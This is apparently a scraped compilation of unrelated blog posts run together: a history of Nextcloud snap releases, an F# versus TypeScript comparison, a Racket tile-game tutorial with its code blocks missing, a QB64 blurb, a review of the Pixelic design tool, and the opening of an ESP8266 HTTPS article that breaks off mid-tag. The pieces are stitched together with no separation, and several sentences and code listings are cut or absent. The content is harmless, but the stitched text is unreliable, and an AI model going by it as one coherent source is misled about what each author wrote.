Let's Encrypt integration. Everything. Despite being created to enable the Nextcloud Box, we made sure that it worked on all architectures, so folks could run it wherever they wanted to.<br></p><p>Before too long, the <a href="https://nextcloud.com/box/">Nextcloud Box</a> became a reality, becoming a joint project between Nextcloud, Western Digital Labs, and Canonical (where Canonical was maintaining the image). At that time, we were actually having to patch Nextcloud to make it work the way we needed it to. We had tried upstreaming that patch to ownCloud, but they turned it down. Which means if you look at the config file you'll see a dirty little secret:</p><pre>/**<br> * Nextcloud doesn't support hosting the config file out of the application, so<br> * this version of Nextcloud has been patched slightly to allow for it. As a<br> * result, we fail the integrity check, so we'll just disable it.<br> */<br>'integrity.check.disabled' =&gt; true,<br></pre><p>Which I why I remember the Nextcloud v10 release so well: <a href="https://github.com/nextcloud/server/pull/1081">Nextcloud didn't have the same problem with that patch</a>, and as of v10 we no longer needed to patch it, and could re-enable the integrity check!<br></p><pre>$ sudo snap install nextcloud --channel=10<br></pre><div id="mediumInsert-11"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/90/nextcloud-10.jpg" alt=""></figure></div><p>That was a solid release, but it wasn't long before v11 was released with all sorts of security features and a preview of what was to become Nextcloud Talk in a few years:</p><pre>$ sudo snap install nextcloud --channel=11</pre><p>There was a lot of similarity between versions 9, 10, and 11, but a ton of new development went into version 12. That was great, but it also meant that a number things broke in version 12. Snaps automatically update, and this is when we really took <i>ownership</i> of that responsibility. We decided we weren't cool automatically breaking people. We've continued that attitude today, so if you've wondered why the snap lags upstream occasionally, that's why. Anyway, eventually the issues were resolved, and we got everyone onto v12:</p><pre>$ sudo snap install nextcloud --channel=12</pre><p>This release finally got rid of that dual menu setup (app menu on the left, settings/users on the right) and unified them really nicely:</p><div id="mediumInsert-34"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/92/nextcloud-12.jpg" alt=""></figure></div><p>Version 12 is still one of my favorite releases simply because no new major releases came out for almost a year. Sadly, it was also during this timeframe that Western Digital Labs shut down, thus ending the Nextcloud Box, and thus officially turning the Nextcloud snap into a personal project for me. Despite that, we settled into a groove of maintenance, and our userbase (and group of testers, who are amazing) grew significantly.<br></p><p>Version 13 saw quite a leap in functionality and design:<br></p><pre>$ sudo snap install nextcloud --channel=13</pre><p>For example, this is where Nextcloud Talk officially made its debut. It's also where they got rid of those pixelated clouds and replaced them with a nice abstract banner:<br></p><div id="mediumInsert-23"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/91/nextcloud-13.jpg" alt=""></figure></div><p>It was only a few months before the update drum started for v14, which came with all sorts of stuff like SMS 2FA and GDPR compliance:</p><pre>$ sudo snap install nextcloud --channel=14</pre><p>Nextcloud 15 took that even further:</p><pre>$ sudo snap install nextcloud --channel=15</pre><p>This is the release that added support for my beloved Yubikey, U2F, and TOTP. This is also where they introduced Nextcloud Social for a federated social network.</p><div id="mediumInsert-51"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/93/nextcloud-15.jpg" alt=""></figure></div><p>Nextcloud 16 came with a much-improved Nextcloud Talk, as well as more fine-grained permissions by way of an access control list:</p><pre>$ sudo snap install nextcloud --channel=16</pre><p>Version 17 is where the remote wipe functionality made its debut, and the shiny new Text app was introduced as the default text editor:</p><pre>$ sudo snap install nextcloud --channel=17</pre><div id="mediumInsert-71"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/94/nextcloud-17.jpg" alt=""></figure></div><p>Nextcloud 18 saw a slight rebranding. They started calling it Nextcloud Hub, and made it super easy to preinstall "recommended" apps, which included Only Office for collaborative document editing:</p><pre>$ sudo snap install nextcloud --channel=18</pre><p>And now we come to current day, version 19, where they switched to Collabora for collaborative document editing instead of Only Office:</p><pre>$ sudo snap install nextcloud --channel=19</pre><div id="mediumInsert-93"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/95/nextcloud-19.jpg" alt=""></figure></div><p>Along with Nextcloud 19, we at Canonical have started the <a href="https://ubuntu.com/appliance">Ubuntu Appliance portfolio</a>, which <a href="https://ubuntu.com/appliance/nextcloud">includes Nextcloud</a>. This is essentially a bring-your-own-box Nextcloud Box: an image with the Nextcloud snap already on there, waiting to be flashed onto a Raspberry Pi or a NUC or something. As soon as it's flashed and booted, you have a Nextcloud install.</p><p>Anyway, I hope this brief walk through history was interesting. Note that all the snap tracks used here will be open forever, so you're welcome to use even the first Nextcloud, but as a general rule of thumb, only the two most recent major releases are actually supported and receive updates. Of course, if you just want the latest stable version, you don't need to specify a track at all:</p><pre>$ sudo snap install nextcloud<br></pre><p>It's been a good four years. Here's to many more!<br></p>

        <article>
    
    <p>While there are many UI libraries available today to build modern web apps, the number of programming languages that compile to JavaScript has also increased in recent years. Here is a quick take on F# and TypeScript.</p>
    
    <h2>Preface</h2>
<p>Although I did focus on mobile apps in the last years, I've spent the first decade or so of my career concatenating strings, also known as web development. So I think I might know a thing or two about how things work there.</p>
<p>However, as I watched the latest hype cycles in the JavaScript universe from the sidelines, I do not have many preferences when choosing "the right" technology stack. Except for one thing. I know for sure that I do not want to build serious software with JavaScript again, except when it acts as a compilation target for a more capable programming language.</p>
<p>So I did take a look at a couple of potential candidates: <a href="https://elm-lang.org/">Elm</a>, <a href="https://reasonml.org/">Reason</a>, <a href="https://www.typescriptlang.org/">TypeScript</a>, and <a href="https://fsharp.org/">F#</a>.</p>
<h2>Shortlist</h2>
<p>While I respect Elm and Reason, the overall experience seemed very close to web development with F#. Which can also be used for server-side tasks (even code-sharing between client and server is possible). So out of those four, F# and TypeScript are the most serious candidates for me. Sorry Elm. Sorry Reason.</p>
<h3>F#</h3>
<p>Since finally <a href="https://thomasbandt.com/who-cares-about-functional-programming">crossing the chasm</a> in 2017, I am a big fan of the language. As a long-time C# developer, it brought back the joy in programming to me. Making a case for using it in production at a larger scale project would intrigue me.</p>
<p>Interestingly, F# today is considered a language targeting two platforms: .NET and JavaScript. That is made possible through <a href="https://fable.io/">Fable</a>, "a compiler powered by Babel designed to make F# a first-class citizen of the JavaScript ecosystem" â€“ which sounds promising, doesn't it.</p>
<h3>TypeScript</h3>
<p>When Microsoft announced <a href="https://www.typescriptlang.org/">TypeScript</a> back in 2012, tooling was poor and excitement limited. It needed a significant player in the JavaScript world, Angular, to pick it up, to gain momentum. Today it is so widely used that I consider it the de facto standard for modern web development.</p>
<p>Its success is driven by a powerful type system plus the fact that it is similar enough to JavaScript to keep the learning curve relatively flat. Besides support for immutable data structures, I do not miss much of what I would expect from a modern programming language.</p>
<h2>A Small Case Study</h2>
<p>Now, how to make an informed decision that is not solely based on gut feelings? Good question. I decided to <a href="https://github.com/aspnetde/typesafe-spa">conduct a small case study</a>, which I designed to explore three different options to build a type-safe single page application:</p>
<ol>
<li><a href="https://github.com/aspnetde/typesafe-spa#elmish--feliz">F# + Elmish + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">F# + React Function Components + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">TypeScript + React</a></li>
</ol>
<p>In particular, I wanted to find answers to the following questions:</p>
<ol>
<li>How are parent-child relationships handled?</li>
<li>How much boilerplate code needs to be written?</li>
<li>How much guidance and support provides the compiler?</li>
<li>How maintainable, aka scalable, does the approach appear to be?</li>
</ol>
<p>The answers to those questions have already been covered in a <a href="https://thomasbandt.com/scaling-model-view-update">separate post</a>. Summary: Going with React components, either with F# or TypeScript, will make you write less code. Whereas choosing MVU (with F# + Elmish) may provide more safeguards through an architecture that is easy to understand and harder to produce errors in.</p>
<p>The bottom line is: Technically, all three approaches are valid, each of them has different strengths and weaknesses. So I cannot recommend one over the other. But I can introduce some more things to consider when making that choice.</p>
<h2>More Things To Consider</h2>
<h3>Language Qualities</h3>
<p>Code written in F# for me more often than not is concise, easy to write, and even more comfortable to read, containing only very few noisy elements. I sometimes sit in front of my computer and just look at F# code, enjoying its beauty. Seriously, that's probably what sets it apart from most other languages I've had the chance to work with. And it brings literally back the joy in programming to me. That's a factor that cannot be stressed enough, in my opinion. I firmly believe that many bored or almost burned out, but very seasoned developers could quickly be sold on it and "flipped."</p>
<p>Whereas TypeScript certainly has different qualities. I like how it integrates with the JavaScript world, offering its type system's help where wanted. But allowing at the same time developers to keep writing their code in the JS style they are used to. It seems to walk the line perfectly fine between the strengths of a statically-typed language and some flexibility and freedom, e.g., through supporting duck-typing. So while I personally am not a big fan of curly braces and semicolons anymore, TypeScript surely provides an enjoyable developer experience as well.</p>
<h3>Vendor Support</h3>
<p>TypeScript receives a lot of attention, not only from Microsoft but industry-wide. I don't see a sign that its development might slow down in the foreseeable future.</p>
<p>Similarily, F# has always been supported by Microsoft since its inception, and a (small) team is actively working on it. So there is no reason to worry about the future of the language itself.</p>
<p>However, while TypeScript is the whole package of compiler plus language, F#'s web story is a bit different. It relies on Fable as the F# to JavaScript compiler. And Fable is a complex operation which, right now, depends on only a few people's willingness to continue to work on it in their spare time (also see "bus factor" below).</p>
<h3>Tooling</h3>
<p>The tooling support for TypeScript is just great. For example, it integrates well in Visual Studio Code and is supported by many other editors and IDEs. Several of them are commercially supported.</p>
<p>The same is actually true for F#. Visual Studio (on Windows and macOS), <a href="https://www.jetbrains.com/rider/">Jetbrains Rider</a> (on Windows, macOS, and Linux) and <a href="https://ionide.io/">Ionide</a> (on all three platforms as well) support it.</p>
<h3>Ecosystem</h3>
<p>For TypeScript, a large amount of JavaScript packages are supported by the community. At the time of writing, there are 6,892 packages supported alone through the <a href="https://github.com/DefinitelyTyped/DefinitelyTyped">DefinitelyTyped</a> project.</p>
<p>Whereas the situation for Fable and F# is not that bright at the moment. There is support for a few essential players, e.g., React and Electron. But if you want to use a small random library, you most likely have to create (and maintain!) those bindings by yourself. Which is not a really complicated task â€“ but one that steals time, which could otherwise be spent working on your own project. And if some of the maintainers of the existing bindings lose interest in them, there is a big chance you will inherit them sooner or later (again, see bus factor).</p>
<h3>Bus Factor</h3>
<p>The sheer number of stakeholders makes TypeScript a safe bet for most things, e.g., tooling or library support. It's not only backed and actively developed by Microsoft, but also used by major web frameworks like Angular (Google) and Vue, or at least officially supported (React, Facebook). But it's not only the impressive number of large players. The community also consists of a large number of individual contributors.</p>
<p>Fable, on the other hand, has a small but active community of contributors and a few companies that are backing it (e.g., through <a href="https://safe-stack.github.io/">SAFE Stack</a>). However, the key drivers of the whole ecosystem are only a dozen or so people who move the entire platform forward in their spare time.</p>
<p>I personally see the chance of reaching the tipping point where the ecosystem might be able to grow faster â€“ but that's totally subjective and possibly more wishful thinking than reality.</p>
<h3>The Pit Of Success</h3>
<p>As <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">described by Jeff Atwood</a>:</p>
<blockquote>
<p>The Pit of Success: in stark contrast to a summit, a peak, or a journey across a desert to find victory through many trials and surprises, we want our customers to simply fall into winning practices by using our platform and frameworks. To the extent that we make it easy to get into trouble we fail.</p>
</blockquote>
<p>While TypeScript is a tool that integrates smoothly in the JS ecosystem, F# and Fable run on top of it. When using Elmish, JS is the eventual compilation target, and React is the execution layer on which the actual F# application is running without many external dependencies. Given this and the high robustness of the F# compiler plus the reliable guidance by the MVU architecture, it makes Fable and F# a poster child of the idea of the pit of success.</p>
<p>Whereas with TypeScript, every component might look different, depending on its author's taste and level of experience.</p>
<h3>Talent Pool</h3>
<p>There is no doubt that TypeScript is one of the <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved programming languages</a> on earth at the time of writing. So it should not be complicated to find TypeScript developers or train any developer on using it.</p>
<p>While not at all being that popular, I think the story for F# might be more rewarding. There is a large pool of .NET developers who mainly use C# today. A language that adopted and continues to borrow more and more features from F# and that is getting more and more bloated on the way. As already mentioned: I believe that many talented and seasoned C# developers can be trained to use F#. This will make programming more enjoyable to them again and allow you to leverage their experience on the .NET platform.</p>
<h2>Conclusion</h2>
<p>As you can see, there are valid arguments for both TypeScript and F#. While I can and will not pick a winner at this point, I hope some information in this post can help you to make an informed decision yourself. I am sure it will be the right one! ;-)</p>

<p>… in which we attempt to recreate a game from the nineties using the <a href="https://alex-hhh.github.io/2020/06/www.racket-lang.org">Racket</a> graphical facilities and we manage to do it in less than 1000 lines of code.</p>

<h2 id="the-game-play">The Game Play</h2>

<p>Instead of explaining the game, it is easier to show the game play. In the video below, the valid tiles are marked with their score, but this would be considered cheating in the actual game. The objective here, however, is to program the game, not to play it.</p>

<p>By the way, if you are in a hurry, you can go directly to the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">the source code</a> for the game.</p>

<hr>

<p>
 <iframe width="700" height="422" src="https://www.youtube.com/embed/UKMgURA5Wg8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe></p>

<hr>

<p>The game is played on a 8x12 board with 72 tiles. There are six colors and six images which combined produce 36 unique tiles. Two of each tile are combined to make the playing set. The objective of the game is to place all the tiles on the board with the following rules:</p>

<ul>
 <li>
  <p>a tile must be placed next to one or more tiles</p></li>
 <li>
  <p>a tile can be placed next to another one if either their color or image  match. If there are multiple tiles around the tile, each neighbor must  match either the color or the image.</p></li></ul>

<p>The game starts with the first six tiles already on the board, one in each corner and two in the middle. The tiles are selected such that each possible color and each possible image is present on the board, thus ensuring that the very first tile can be placed on the board.</p>

<p>Scoring is done to reflect the complexity of the placement, with 1 point awarded if a tile is placed next to a single tile, 2 points for placing it against two tiles, 4 points for placing it against 3 neighbors and 8 points for placing it against 4.</p>

<p>The game ends when either there are no more tiles to be placed on the board or there is no valid location on which to place a tile.</p>

<h2 id="the-libraries">The Libraries</h2>

<p>Given that this is an interactive game where the user needs to drag tiles on a board, the easiest way to implement this game is to use <a href="https://docs.racket-lang.org/gui/Snip_and_Style_Classes.html">snips</a> and a <a href="https://docs.racket-lang.org/gui/editor-overview.html">pasteboard</a>. The <code>pasteboard%</code> is one of the two editors provided by the Racket GUI framework and it will handle most of drag and drop functionality which the game requires. To use it, we will need to provide two classes:</p>

<ul>
 <li>
  <p>a <code>snip%</code> class which represents a tile. A snip is an object which knows  its size and how to draw itself. You can do cool things with snips, such as  <a href="https://alex-hhh.github.io/2019/09/map-snip.html">rendering maps</a> and even basic <a href="https://alex-hhh.github.io/2019/09/interactive-heat-maps.html#embedded-snip-controls">GUI  controls</a>.</p></li>
 <li>
  <p>a <code>pasteboard%</code> class which manages the snips (it can also draw things of  its own). While we can use the <code>pasteboard%</code> directly for testing purposes,  we will need to define our own class to implement the restrictions imposed  by the game.</p></li></ul>

<p>The game will also use the <a href="https://docs.racket-lang.org/draw/index.html">racket/draw</a> facilities for drawing directly to a device context. The draw functions provided by <code>snip%</code> and <code>pasteboard%</code> already use <code>dc&lt;%&gt;</code> objects, and while we could have used the <code>pict</code> library for rendering, for this simple case, it was thought unnecessary.</p>

<h2 id="the-assets">The Assets</h2>

<p>While the game board can be drawn using just lines, the game tiles will need six colors and six images, and it would help if these images would be nice ones, rather than using simply a circle, square and triangle shapes. The Unicode character set has lots of <a href="http://unicode.org/emoji/charts/full-emoji-list.html">emoji characters</a> to choose from, and these are directly supported by Racket, which means that they can be stored in strings.</p>

<p>In the game code, I choose to represent the unicode characters using the <code>\U</code> escape sequence followed by a code point, and during development using <code>display</code> or the <code>text</code> pict constructor to see the actual glyphs in the DrRacket REPL:</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/glyphs.png" alt=""></p></div>

<p>Choosing six colors can also be a difficult task if we want colors which look nice, are visually distinct and are also distinct for color-blind people. I don’t know how to chose colors which meet all this criteria, so my preferred way is to find color schemes defined by others, in this case, one of <a href="https://personal.sron.nl/~pault/">Paul Tol’s Color Schemes</a>, the “bright qualitative” one:</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/colors.png" alt=""></p></div>

<h2 id="the-theme">The Theme</h2>

<p>Rather than storing the drawing assets (color and glyph) in each tile object, a helper class can be used to manage the common functionality and assets for all snips. A theme class also allows changing the “theme”, that is the colors and images at runtime — this is not implemented in this game, but could be added easily. Even without the ability to change themes, moving some common functionality in a separate class keeps the tile class simpler.</p>

<p>In addition to managing the graphics assets for drawing, the theme class also provides the size of each tile (the <code>cell-width</code> and <code>cell-height</code> fields). These are calculated by the board itself when it is resized and communicated to the theme and from here used by all tiles in the game:</p>



<h2 id="the-tiles">The Tiles</h2>

<p>The tiles represent the objects that can be moved on the board and they are implemented using snips. Two things are needed to create a new snip: define a snip class (not to be confused with a racket <code>class%</code>) and create a class derived from <code>snip%</code> overriding the <code>get-extent</code> and <code>draw</code> methods.</p>

<p>The snip class is used for serializing and de-serializing snip objects, but even though we don’t use this functionality in the game, we still need to define one. The definition is identical for any snip class, except they need to have unique names. Note that the snip class is actually an instance of <code>snip-class%</code> and not a class in itself:</p>

<p>We define our own <code>tile%</code> class derived from the <code>snip%</code> class. As far as the pasteboard is concerned, the new object needs to: (1) set the snip class for each instance (see the <code>set-snipclass</code> call below, (2) define a <code>get-extent</code> method which the pasteboard can use to determine the size of the snip and (3) define a draw method which is used to draw the snip.</p>

<p>In addition to the snip interface, also has a <strong>key</strong> a <strong>theme</strong> and a <strong>location</strong>. The <strong>key</strong> is a structure which contains the color and glyph codes for the tile and the <strong>theme</strong> is an object which holds the colors and glyphs used by the game (the tile class will ask the theme for the actual color to use corresponding to its key). The key and the theme are used for drawing the snip. Finally, the <strong>location</strong> is a structure which holds the location of the tile on the board (column and row). It is not used by the tile class at all, but it the pasteboard will need to know the location of each tile, so might as well store it inside the tile object you can find the full definition in the <a href="https://gist.github.com/alex-hhh/2e204b3a9d9d7094f65a0b585d0b7480">game source code</a>.</p>



<p>With the tile snip defined, we can write a quick test program to see how it works. Here we will use just a plain <code>pasteboard%</code> which will display the snip and allow moving them around with the mouse. There are several objects which make up the “game”:</p>

<ul>
 <li>the <code>bq-colors</code>, and <code>bird-glyphs</code> define the colors and images to use for  the tiles and they are managed by the <code>theme</code> object</li>
 <li>the <code>board</code> is simply the <code>pasteboard%</code> instance we’ll use</li>
 <li><code>toplevel</code> is the toplevel GUI window for the application, an instance of  the <code>frame%</code> class</li>
 <li><code>canvas</code> is the <code>editor-canvas%</code> which acts as the view for the  <code>pasteboard%</code> (the pasteboard itself only manages snips, displaying is  handled by one or more <code>editor-canvas%</code> instances)</li></ul>

<p>The code also creates six tiles, one for each color and image and inserts them into the pasteboard.</p>

<p>The result is an interactive application, which allows dragging the snips around. The <code>pasteboard%</code> provides a lot of functionality out of the box, but it still needs to be further customized to restrict its functionality according to the rules of the game (for example, snips should only be placed in precise positions on a board):</p>

<div><p><img src="https://alex-hhh.github.io/img/a040/pasteboard.gif" alt=""></p></div>

<h2 id="the-pouch">The Pouch</h2>

<p>Having defined the tiles, we need to produce 72 of them, preferably in random order, so it they can be used in the game. To generate all the possible tiles, we can use nested for loops over the all the possible colors and images:</p>



<p>The previous list is ordered by color and image, and we need to shuffle it:</p>



<p>Finally, and this is the tricky bit, the first six tiles need to have unique colors and images. This is because the first six tiles are already on the board when the game starts and to ensure that the user can always place the next tile, all the colors and images need to be on the board. To achieve this, we loop over the shuffled tiles and move the first six unique tiles to the front. Doing this ensures that, while the first tiles are unique, they also start in a random order for each game.</p>

<h2>From the 80s to eternity</h2>



<p><strong>How BASIC made its way into the 21st century</strong></p>



<p>The BASIC language has been the gateway into programming for countless people. Popular as a beginner programming language in the 80’s and evolving into a powerful professional tool in 90’s, BASIC (and its successor QBasic), helped many people develop a love for programming. These languages provided the foundational learning platform for most of today’s professional developers.</p>



<p>The QB64 project has evolved over the last decade to bring the magic and educational potential of BASIC from its 20th century roots into the modern era. The QB64 project is already in use in both educational and professional contexts and has an active and helpful user community.</p>



<p>Unlike traditional BASIC and QBasic code, QB64 gets compiled automatically into machine code – allowing exceptional performance, easy distribution, and the ability to link with external C and C++ programming libaries. Compatible with most QBasic 4.5 code, QB64 adds a number of extensions, such as OpenGL and other modern features, providing the perfect blend of classic and modern program development.</p>



<p>QB64 is available for all recent Windows, Linux, and macOS versions.</p>

                    <p>A few weeks ago, our team adopted a tool called <a href="https://www.pixelic.io/">Pixelic</a>, a UX collaboration tool that integrates with Figma and Slack to make design feedback, task management, and documentation more accessible.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/Screenshot-2020-07-01-14.57.58.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/Screenshot-2020-07-01-14.57.58.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/Screenshot-2020-07-01-14.57.58.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/Screenshot-2020-07-01-14.57.58.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/Screenshot-2020-07-01-14.57.58.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Pixelic's Figma frames screen.</figcaption></figure><p>I observed our team go through multiple design iterations using the tool and thought it’d be helpful for other designers and teams to get a perspective on how Pixelic makes the UX design process much easier.</p><p>Here are three topics that I’ll be sharing:</p><ol><li>When do you use Pixelic?

Notion and Zeplin were our go-to-tools for this during the “Understanding” phase in our design process.</p><p>It was pretty difficult to switch from Notion/Zeplin right away, but we hope to see more improvements in Pixelic’s documentation features.</p><h2 id="where-pixelic-came-in-handy-for-our-team">Where Pixelic came in handy for our team</h2><p>We realized that Pixelic could be a source of truth for the communication log as it integrates with Figma and Slack. This came in handy during our Design QA phase.</p><p>Before Pixelic, we had to manually create QA documents in Notion and share it with our engineering and product partners. We would copy and paste several links, upload screenshots, write thorough descriptions on the acceptance criteria.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1600w, https://blog.pixelic.io/content/images/2020/06/Screen-Shot-2020-06-30-at-17.09.35.png 1942w" sizes="(min-width: 720px) 720px"><figcaption>Sample Notion screen. There was so much to fill out in Notion to make our design QA work.</figcaption></figure><p>With Pixelic, we’re now able to just import Figma frames into the tool and write acceptance criteria using Pixelic’s annotation feature. There’s no need for us to take screenshots, copy/paste Zeplin links, and communicate with our engineering partners to create QA tasks. Pixelic did them all automatically.</p><h3 id="1-tracking-design-task-backlog-history">1) Tracking design task backlog history</h3><p>Not having an optimal product development and design process often made our workflow less productive. It looked something like this:</p><ol><li>Designer “A” and Developer “B” review design and exchange feedback in Slack</li><li>They then add the outcome (often design tasks) of the meeting to a Jira project Kanban board under the backlog</li><li>Product manager “C” notices the new task, but doesn’t have any context as to why it was created. So “C” requests designers “A” &amp; “B” to explain.</li><li>Teammates “A” &amp; “B” stop what they were doing, and loop C in so “C” could understand the context</li></ol><p>If only we had a place where the product manager (“C”) can read/understand the context behind a task or decision without asking the designers “A” and “B,” they would have kept their focus on doing more important tasks. We became less productive as a team due to redundant meetings and discussion. (Meetings are seldom productive!)</p><p>We found that Pixelic was a perfect tool for this pain point. Here are a few ways Pixelic helped us:</p><h3 id="2-pixelic-automates-task-creation-process">2) Pixelic automates task creation process</h3><p>It’s pretty difficult to keeping track of action items during design reviews. Someone has to take charge of translating discussions into actionable tasks and adding them to a project board while others continue discussing.</p><p>But with Pixelic, all you need to do is click the “taskify” button on each comment. Even during meetings, you can convert comments into tasks while viewing the design, so there’s no “context-switching cost” incurred. Pixelic lets you convert comments into tasks without diverging from the discussion.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/taskify.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/taskify.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/taskify.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/taskify.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/06/taskify.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>"Taskify" button on each comment on Pixelic converts respective comments into tasks</figcaption></figure><p>Traditionally, teams switch between communication apps (e.g., Slack) and task management apps (e.g., Jira, Notion, etc.) to go back and forth, discussing and adding tasks. Pixelic converges them together so that you can instantly flip the switch to “taskify” a comment.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1000w, https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>Switching back and forth Slack and Notion to manage feedback and tasks at the same time is cumbersome.</figcaption></figure><p>Pixelic also has built-in version control for each Figma frame.

This is different from what you see in Notion or Jira, Pixelic’s Figma integration imports actual Figma frames into the tool for you.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/task-comments.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/task-comments.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/task-comments.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/task-comments.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/task-comments.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Figma frame comments are always connected with tasks bi-directionally.</figcaption></figure><p>This has two key benefits: (1) anyone can understand the context behind the task without asking others, and (2) view relevant Figma frames, or user flows without logging into Figma.</p><p>Engineers and product managers can access relevant UIs connected to each task and quickly understand the task.</p><p>Adding links, screenshots, and descriptions to each task on Jira or Asana is cumbersome if you have to do them every time. In Pixelic, since Figma frames are connected to each task, there’s no need to copy/paste links or screenshots.</p><blockquote>“What if we allow our users to sign up directly from the <strong>home screen</strong>?”</blockquote><p>Let’s say your colleague suggested above during a product meeting. How many of your team would think of the same screen? Was it the landing page? Sign up page? Main application page?</p><p>Without a shared understanding of the product, it’s challenging to communicate, and often people would have to elaborate with more details.</p><p>It’s too hard for people to see the forest through the trees, so to speak. Without the interface, people will think of different representations of the product. It’s just not an effective way to collaborate.</p><blockquote>“This wasn’t what I thought of.”<br>– said every stakeholder 🙄</blockquote><p>Driving shared understanding is crucial to make your workflow productive. Too often, teams revert back to ideation because they failed to align on the same page.</p><p>From my experience working at various startups as a product designer, what worked was communicating visually.</p><p>Visual communication saves not only the presenter’s time but also the audience because they can see what you’re seeing. Experts say a human brain processes images 60,000 times faster than texts.</p><h3 id="pixelic-is-the-ultimate-visual-communication-software">Pixelic is the ultimate visual communication software</h3><figure><img src="https://blog.pixelic.io/content/images/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 1000w, https://blog.pixelic.io/content/images/2020/07/1_byhPFhrNBgI_cTJWJq1bMw.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>I took a screenshot of our team discussion on Pixelic (in Korean).</figcaption></figure><p>In offline meetings, you can point out where you are talking about with your fingertips, but in remote settings, it’s not that simple. And remote collaboration via video conferencing now became the norm since COVID-19.</p><p>Pixelic helped us see the visuals (interface) as well as comments next to them while video conferencing. In Pixelic, you can click &amp; drag specific areas of the image and comment on them. This helped us to store everything so we could always go back to them later.</p><h2 id="in-conclusion">In Conclusion</h2><p>Yes, adding a tool to your already tool stack isn’t the most exciting thing for your team. But if the new tool replaces or complements your current stack to enhance team productivity, it’s a no brainer to adopt it.</p><p>Pixelic was a no brainer for us. Through Pixelic, we were able to enhance our team productivity. It helped us build a clear, shared understanding of our product across the team. And managing design projects were super easy and convenient thanks to its seamless integration with Figma.</p><p>There are some features that Pixelic still needs to add to replace our entire design collaboration tool stack, but ever since we started using Pixelic, its founders moved fast to add new fixes and updates every week.</p><p>The founders have been super supportive of any questions or requests we had. We’re excited to partner with the Pixelic team to build an optimal tool for software teams.</p><hr><p><em>Jieun is a product designer based in Seoul, South Korea.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Fetching or posting data to the internet is one of the core tasks of an IoT device. Doing so over HTTP is implemented quite well in the default ESP8266 Arduino libraries, but for HTTPS requests things are more difficult. In this post I will discuss the most common approaches used by the community, and develop my own method to do arbitrary HTTPS requests in a secure way. This method will not require any specific certificates or fingerprints to be manually coded in the application.</p><p>HTTPS if a method to do a HTTP request over a TLS (formerly SSL) connection. By doing so, the data that is sent back and forth between your computer and the server is encrypted and protected. The good news is that this protocol can be used with the ESP8266 with the <span>WiFiClientSecure</span> class. The bad news is that the common methods to do so have some big disadvantages.</p><p>First I will show the two most common approaches, and next I will describe a generic solution to their problems.</p><h3>A word about certificates</h3><p>Before diving into the details I will briefly explain the basic principles of secure HTTPS requests in layman's terms.</p><p>Basically, every website has a certificate. This certificate is issued by somebody, who is called a certification authority (CA). Each CA certificate can be issued by another CA which leads to the so called certificate chain. In the picture the chain is 3 certificates long, but in reality the length of the chain can be anything.</p><p>A certificate chain. Image from Wikipedia</p><p>The top level certificate is called a root certificate. This certificate is self-signed, which means that it can be trusted inherently. This is because only a few organisations can issue root certificates, and these are trusted to not offer fake or wrong certificates.</p><p>When you do a HTTPS request to a website from your browser, the browser will look at the certificate for the website, and validating if the certificate is indeed issued by its parent. This can be done because each certificate is signed with the private key of the upstream certificate. An explanation for dummies on public and private keys work can be found <a href="https://medium.com/@vrypan/explaining-public-key-cryptography-to-non-geeks-f0994b3c2d5" target="_blank" rel="noopener noreferrer">here<!-- --> <span><svg stroke="currentColor" 